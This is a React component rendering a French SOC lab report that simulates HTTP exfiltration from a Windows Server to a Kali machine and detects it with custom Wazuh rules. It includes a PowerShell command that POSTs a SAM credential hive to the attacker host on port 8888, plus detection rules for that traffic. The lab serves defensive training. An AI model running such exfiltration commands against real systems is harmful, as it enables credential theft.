import { ReportHeader, H2, H3, Cmd, Table } from './ReportUI'

export default function RapportExfiltration() {
  return (
    <article className="text-zinc-300 leading-relaxed">
      <ReportHeader
        title="Exfiltration HTTP non chiffrée"
        subtitle="Chapitre 6, Module 6 · MITRE T1048.003 (Exfiltration Over Unencrypted Non-C2 Protocol)"
        meta="28 juin 2026 · Kali [KALI] → Windows Server 2022 [SERVEUR] · Wazuh 4.12.0"
      />

      <H2>1. Objectif</H2>
      <p>
        Simuler l'exfiltration de données depuis un serveur Windows compromis vers la machine attaquante,
        via HTTP en clair, puis la détecter dans Wazuh avec des règles custom. L'exfiltration est la
        dernière étape d'une attaque : l'attaquant a déjà l'accès, il fait sortir les données volées.
      </p>

      <H2>2. L'attaque</H2>
      <H3>Étape 1 — Serveur HTTP récepteur sur Kali</H3>
      <Cmd term="Kali">{`mkdir -p /tmp/exfil && cd /tmp/exfil
python3 -m http.server 8888 --bind 0.0.0.0`}</Cmd>
      <H3>Étape 2 — Exfiltration depuis Windows (Living off the Land)</H3>
      <Cmd term="Windows Server — PowerShell Admin">{`Invoke-WebRequest -Uri http://[KALI]:8888/sam.hive \`
  -Method POST -InFile C:\\Windows\\Temp\\sam.hive`}</Cmd>
      <p>
        <span className="font-mono text-xs">Invoke-WebRequest</span> est un outil Windows légitime : aucun
        binaire suspect installé, donc difficile à détecter par signature. Côté Kali :{' '}
        <span className="font-mono text-xs">"POST /sam.hive HTTP/1.1" 200</span> → exfiltration réussie.
      </p>

      <H2>3. L'angle mort du SIEM</H2>
      <p>
        Premier essai : <b>zéro alerte</b>. Sysmon (Event ID 3) avait bien vu la connexion PowerShell vers
        le port 8888, mais aucune règle Wazuh ne couvrait ce cas → l'évènement a été jeté
        (<span className="font-mono text-xs">logall = no</span>). Un SIEM ne conserve que ce qui matche une
        règle.
      </p>

      <H2>4. Solution — Règles custom</H2>
      <Cmd term="Ubuntu WSL — manager Wazuh">{`# /var/ossec/etc/rules/local_rules.xml
<rule id="100010" level="12">
  <if_group>sysmon_eid3_detections</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)powershell</field>
  <description>PowerShell connexion reseau suspecte</description>
  <mitre><id>T1048</id></mitre>
</rule>
<rule id="100011" level="14">
  <if_group>sysmon_eid3_detections</if_group>
  <field name="win.eventdata.destinationPort">8888</field>
  <description>Connexion vers port 8888 - possible exfiltration HTTP</description>
  <mitre><id>T1048.003</id></mitre>
</rule>`}</Cmd>
      <Table
        head={['Rule ID', 'Détecte', 'Niveau', 'Faux positifs']}
        rows={[
          ['100010', 'Toute connexion réseau faite par PowerShell', '12', 'Possible (PS légitime)'],
          ['100011', 'Connexion vers le port 8888 spécifiquement', '14', 'Très rares'],
        ]}
      />
      <Cmd term="Ubuntu WSL — manager Wazuh">{`docker exec single-node-wazuh.manager-1 /var/ossec/bin/verify-agent-conf
docker exec single-node-wazuh.manager-1 /var/ossec/bin/wazuh-control restart`}</Cmd>

      <H2>5. Vérification — Rejouer l'exfiltration</H2>
      <p>Après restart, la même commande est rejouée. Cette fois la règle 100011 se déclenche :</p>
      <Table
        head={['Champ Wazuh', 'Valeur observée']}
        rows={[
          ['rule.id / rule.level', '100011 / 14 (High)'],
          ['rule.description', 'Connexion vers port 8888 - possible exfiltration HTTP'],
          ['data.win.eventdata.image', 'powershell.exe'],
          ['data.win.eventdata.destinationPort', '8888'],
          ['data.win.eventdata.destinationIp', '[KALI] (Kali)'],
          ['rule.mitre.id', 'T1048.003'],
        ]}
      />

      <H2>6. Leçons SOC</H2>
      <ul className="list-disc pl-5 space-y-2">
        <li>
          <span className="text-zinc-100 font-medium">Angle mort SIEM :</span> Wazuh est aveugle à tout ce
          pour quoi il n'a pas de règle. Un évènement sans règle = jeté.
        </li>
        <li>
          <span className="text-zinc-100 font-medium">Règles custom :</span> quand une technique n'est pas
          couverte par défaut, l'analyste crée sa propre règle — compétence clé.
        </li>
        <li>
          <span className="text-zinc-100 font-medium">Living off the Land :</span> PowerShell étant
          légitime, Defender ne bloque pas — c'est au SIEM de détecter le comportement anormal.
        </li>
      </ul>
    </article>
  )
}
